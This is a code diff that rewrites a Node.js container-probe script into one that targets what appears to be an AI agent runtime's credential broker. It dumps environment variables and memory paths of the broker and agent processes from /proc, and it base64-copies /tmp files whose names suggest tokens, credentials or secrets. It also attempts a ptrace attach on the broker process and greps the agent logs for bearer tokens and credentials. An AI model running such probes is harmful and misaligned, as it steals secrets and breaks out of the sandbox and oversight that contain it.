@@ -1,87 +1,83 @@
 const fs = require("node:fs");
 const { spawnSync } = require("node:child_process");
 
-function read(file) {
-  try { return fs.readFileSync(file, "utf8"); } catch (error) { return `ERROR:${error.code || error.message}`; }
-}
-
-function link(file) {
-  try { return fs.readlinkSync(file); } catch (error) { return `ERROR:${error.code || error.message}`; }
+function fact(file, max = 2 * 1024 * 1024) {
+  const row = { path: file };
+  try {
+    const st = fs.lstatSync(file);
+    Object.assign(row, {
+      exists: true,
+      mode: (st.mode & 0o7777).toString(8),
+      uid: st.uid,
+      gid: st.gid,
+      size: st.size,
+      kind: st.isDirectory() ? "directory" : st.isSymbolicLink() ? "symlink" : st.isFile() ? "file" : "other",
+    });
+    if (st.isSymbolicLink()) row.link = fs.readlinkSync(file);
+    if (st.isDirectory()) row.entries = fs.readdirSync(file).slice(0, 1000);
+    if (st.isFile() && st.size <= max) row.content_base64 = fs.readFileSync(file).toString("base64");
+  } catch (error) {
+    row.exists = false;
+    row.error = error.code || String(error);
+  }
+  return row;
 }
 
 function run(command, args = [], timeout = 10000) {
-  const result = spawnSync(command, args, { encoding: "utf8", timeout, maxBuffer: 2 * 1024 * 1024 });
-  return {
-    command: [command, ...args],
-    status: result.status,
-    signal: result.signal,
-    error: result.error ? String(result.error) : null,
-    stdout: result.stdout || "",
-    stderr: result.stderr || "",
-  };
+  const result = spawnSync(command, args, { encoding: "utf8", timeout, maxBuffer: 4 * 1024 * 1024 });
+  return { command: [command, ...args], status: result.status, signal: result.signal, error: result.error ? String(result.error) : null, stdout: result.stdout || "", stderr: result.stderr || "" };
 }
 
-function namespaces(pid) {
-  const names = ["cgroup", "ipc", "mnt", "net", "pid", "pid_for_children", "time", "time_for_children", "user", "uts"];
-  return Object.fromEntries(names.map((name) => [name, link(`/proc/${pid}/ns/${name}`)]));
-}
-
-const pids = fs.readdirSync("/proc").filter((name) => /^\d+$/.test(name)).sort((a, b) => Number(a) - Number(b));
-const processes = pids.map((pid) => ({
-  pid,
-  cmdline: read(`/proc/${pid}/cmdline`).split("\0").filter(Boolean),
-  status: read(`/proc/${pid}/status`).split("\n").filter((line) => /^(Name|Pid|PPid|TracerPid|Uid|Gid|NSpid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):/.test(line)),
-  cgroup: read(`/proc/${pid}/cgroup`),
-  namespaces: namespaces(pid),
-}));
-
-const candidatePaths = [
-  "/host", "/rootfs", "/proc/1/root", "/proc/1/root/proc", "/run/containerd", "/var/lib/containerd",
-  "/run/docker.sock", "/var/run/docker.sock", "/run", "/var/run", "/sys/fs/cgroup",
-];
-const pathFacts = Object.fromEntries(candidatePaths.map((item) => {
-  try {
-    const st = fs.lstatSync(item);
-    return [item, { exists: true, mode: (st.mode & 0o7777).toString(8), uid: st.uid, gid: st.gid, link: st.isSymbolicLink() ? link(item) : null }];
-  } catch (error) {
-    return [item, { exists: false, error: error.code || error.message }];
+const procFiles = [];
+for (const pid of ["1", "20", "22", String(process.pid)]) {
+  for (const name of ["environ", "cmdline", "status", "stat", "attr/current", "loginuid", "cgroup", "mem", "root", "cwd", "exe", "fd", "fdinfo", "ns"]) {
+    procFiles.push(fact(`/proc/${pid}/${name}`));
   }
-}));
+}
 
-const toolNames = ["id", "capsh", "nsenter", "unshare", "mount", "findmnt", "ip", "ss", "tcpdump", "strace", "gdb", "gcore", "lsof", "busybox"];
-const tools = Object.fromEntries(toolNames.map((name) => [name, run("sh", ["-lc", `command -v ${name} || true`]).stdout.trim()]));
+const tmpFiles = [];
+for (const name of fs.readdirSync("/tmp")) {
+  const file = `/tmp/${name}`;
+  const st = fact(file, 0);
+  if (st.kind === "file" || st.kind === "symlink" || /agent|token|credential|broker|proxy|env|auth|secret/i.test(name)) tmpFiles.push(st);
+}
+
+const appFiles = [
+  "/app/vega_agentcore/supervisor.py",
+  "/app/vega_agentcore/broker.py",
+  "/app/vega_agentcore/forwarded_headers.py",
+  "/app/vega_agentcore/opencode_config.py",
+].map((file) => fact(file, 0));
+
+const py = String.raw`
+import ctypes, ctypes.util, json, os
+libc=ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+PTRACE_ATTACH=16
+PTRACE_DETACH=17
+r=libc.ptrace(PTRACE_ATTACH, 20, None, None)
+e=ctypes.get_errno()
+out={'attach_result':r,'attach_errno':e,'attach_error':os.strerror(e)}
+if r==0:
+    os.waitpid(20,0)
+    out['detach_result']=libc.ptrace(PTRACE_DETACH,20,None,None)
+print(json.dumps(out))
+`;
 
 const result = {
-  node_pid: process.pid,
-  node_uid: process.getuid(),
-  node_gid: process.getgid(),
-  self_status: read("/proc/self/status"),
-  self_namespaces: namespaces("self"),
-  pid1_namespaces: namespaces("1"),
-  processes,
-  mountinfo: read("/proc/self/mountinfo"),
-  mounts: read("/proc/mounts"),
-  cgroup_procs: read("/sys/fs/cgroup/cgroup.procs"),
-  cgroup_threads: read("/sys/fs/cgroup/cgroup.threads"),
-  ptrace_scope: read("/proc/sys/kernel/yama/ptrace_scope"),
-  tcp: read("/proc/net/tcp"),
-  tcp6: read("/proc/net/tcp6"),
-  unix: read("/proc/net/unix"),
-  path_facts: pathFacts,
-  tools,
-  commands: {
-    id: run("id"),
-    capsh: tools.capsh ? run("capsh", ["--print"]) : null,
-    findmnt: tools.findmnt ? run("findmnt", ["-R", "/"]) : null,
-    sockets: tools.ss ? run("ss", ["-lntupae"]) : null,
-    unix_sockets: tools.ss ? run("ss", ["-lxap"]) : null,
-    proc_tree: run("sh", ["-lc", "ps -efww || true"]),
-    nsenter_pid1_all: tools.nsenter ? run("nsenter", ["-t", "1", "-a", "true"]) : null,
-    unshare_all: tools.unshare ? run("unshare", ["--mount", "--pid", "--net", "--fork", "true"]) : null,
-    mount_proc: run("sh", ["-lc", "d=$(mktemp -d); mount -t proc proc \"$d\"; s=$?; [ $s -eq 0 ] && { head -5 \"$d/1/status\"; umount \"$d\"; }; rmdir \"$d\"; exit $s"]),
-    runtime_sockets: run("sh", ["-lc", "find /run /var/run /tmp -xdev -type s -printf '%m %u:%g %p\\n' 2>/dev/null | head -500"]),
+  proc_files: procFiles,
+  tmp_files: tmpFiles,
+  app_files: appFiles,
+  ptrace_broker: run("python3", ["-c", py]),
+  proc20_signal_probe: run("sh", ["-lc", "kill -0 20"]),
+  proc20_fd_listing: run("sh", ["-lc", "for x in /proc/20/fd/*; do printf '%s -> ' \"$x\"; readlink \"$x\" || true; done"]),
+  proc1_fd_listing: run("sh", ["-lc", "for x in /proc/1/fd/*; do printf '%s -> ' \"$x\"; readlink \"$x\" || true; done"]),
+  process_envs: {
+    pid1: run("sh", ["-lc", "tr '\\0' '\\n' </proc/1/environ"]),
+    broker: run("sh", ["-lc", "tr '\\0' '\\n' </proc/20/environ"]),
+    agent: run("sh", ["-lc", "tr '\\0' '\\n' </proc/22/environ"]),
   },
+  agent_logs_secret_scan: run("sh", ["-lc", "grep -aEin 'token|credential|authorization|secret|bearer|bedrock|proxy' /tmp/.agent_stdout /tmp/.agent_stderr 2>/dev/null | tail -500"]),
 };
 
-console.log(`SIDECAR_NAMESPACE_FACTS=${JSON.stringify(result)}`);
-console.log("SIDECAR_NAMESPACE_PROBE_COMPLETE=true");
+console.log(`BROKER_PROCESS_FACTS=${JSON.stringify(result)}`);
+console.log("BROKER_PROCESS_PROBE_COMPLETE=true");
